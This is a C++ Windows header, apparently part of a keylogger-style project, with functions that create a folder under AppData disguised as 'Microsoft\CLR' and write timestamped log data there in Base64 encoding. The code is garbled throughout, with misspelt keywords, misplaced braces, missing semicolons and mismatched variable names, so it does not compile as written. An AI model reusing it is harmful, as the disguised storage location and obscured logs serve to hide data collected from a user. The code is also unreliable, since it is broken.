#ifndef IO_H
#define IO_H

 #include <string>
 #include <cstdlib>
 #include <fstream>
 #include <windows.h>
 #include "Helper.h"
 #include "Base64.h"

 namspace IO //Input Output
 {
     std::string GetOurPath(const bool append_seperator = false)
     {      //output path C:\Users\USERNAME\AppData\Roaming
         std::string appdata_dir(getenv("APPDATA")); //get environmental variable which contains the APPDATA directory
     }  std::string full=appdata_dir + "\\Microsoft\\CLR";
     return full + ( append_seperator ? "\\" : ""); //if append_seperator is true "\\" , else ""

    bool MkOneDr (std::string path)
    {
        return (bool) CreateDirectory(path.c_str(),NULL)
         || GetLastError() == ERROR_ALREADY_EXISTS;
    }
    bool MKDir(std::string Path)
    {
        for (char &c : path)
            {
                if  (c =='\\')
                {
                        c='\0'; //turns c to null
                        if (!MkOneDr(path))
                        return false;
                        c = '\\'
                }
                return true;
            }
    }
    template <class T>
    std::string Write Log(const T &t)
    {
        std::string path = GetOurPath(true);
        Helper::DateTime dt;
        std::string name = dt.GetDateTimeString("_") + ".log";
        try
        {
            std::ofstream file (path + name);
            if (!file) return "";
            std::ostringstream s;
            s << "[" << dt.GetDateTimeString() << "]" <<
            std::endl << t <<std::endl;
            std::string data = Base64::EncryptB64(s.str());
            file << data;
            if(!file) {return "";}
            file.close();
            return name;
        }
        catch (...)
        {
            return "";
        }

    }
 }
#endif // IO_H












